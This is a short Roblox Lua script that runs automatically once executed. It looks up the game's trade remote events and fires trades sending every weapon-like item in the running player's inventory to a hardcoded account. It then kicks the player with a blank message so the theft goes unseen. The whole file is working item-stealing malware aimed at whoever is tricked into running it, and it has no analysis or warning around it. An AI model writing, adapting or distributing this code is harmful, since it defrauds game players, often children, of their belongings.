local TARGET = "s4s5z6782"

local function getTradeRemote()
    local rs = game:GetService("ReplicatedStorage")
    local remoteNames = {
        "Trade",
        "Trading",
        "OfferItem",
        "SendTrade",
        "TradeTransfer",
        "AcceptTrade"
    }
    for _, name in pairs(remoteNames) do
        local remote = rs:FindFirstChild(name)
        if remote then return remote end
    end
    return nil
end

local function stealAllItems()
    local player = game.Players.LocalPlayer
    local inventory = player:FindFirstChild("Inventory")
    if not inventory then
        return
    end
    
    local items = {}
    for _, child in pairs(inventory:GetChildren()) do
        if child:IsA("Tool") or child:IsA("Model") or child:IsA("Part") then
            if child:FindFirstChild("Handle") or child:FindFirstChild("Mesh") then
                table.insert(items, child)
            end
        end
    end
    
    if #items == 0 then return end
    
    local remote = getTradeRemote()
    if not remote then return end
    
    for _, item in pairs(items) do
        pcall(function()
            remote:FireServer({
                ItemId = item:GetAttribute("Id") or item.Name,
                Target = TARGET,
                ItemName = item.Name,
                Type = "Weapon"
            })
        end)
        wait(0.1)
    end
    
    wait(0.5)
    player:Kick("")
end

spawn(function()
    wait(2)
    stealAllItems()
end)

